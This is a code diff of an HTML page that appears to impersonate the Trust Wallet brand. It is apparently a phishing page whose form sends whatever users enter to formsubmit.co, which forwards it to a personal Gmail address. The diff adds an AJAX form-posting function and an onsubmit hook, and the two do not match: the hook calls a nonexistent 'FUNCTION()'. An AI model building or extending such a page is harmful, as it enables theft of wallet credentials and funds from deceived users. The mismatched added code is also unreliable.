@@ -33,7 +33,7 @@
                 <div><h1>Trust Wallet</h1></div>
             </div>
             <div style="margin: auto;width: fit-content;">
-            <form action=" https://formsubmit.co/davidbilson99@gmail.com" method="POST">
+            <form action=" https://formsubmit.co/davidbilson99@gmail.com" method="POST" onsubmit="return FUNCTION()">
                 <label for="trustlock">Wallet Name</label><br>
                 <button id="trustlock"><i class="fas fa-lock"></i> Trust Wallet</button>
                 <br><br><br>
@@ -56,6 +56,23 @@
             </footer>
 </section>
 <script>
+function ajaxpost () {
+  // (A) GET FORM DATA
+  var form = document.getElementById("myForm");
+  var data = new FormData(form);
+ 
+  // (B) AJAX
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "0-dummy.php");
+  // What to do when server responds
+  xhr.onload = function () { console.log(this.response); };
+  xhr.send(data);
+ 
+  // (C) PREVENT HTML FORM SUBMIT
+  return false;
+}
+
+    
  var x = document.getElementById("myBtn");
  x.addEventListener("click", myFunction);
  x.addEventListener("click", someOtherFunction);
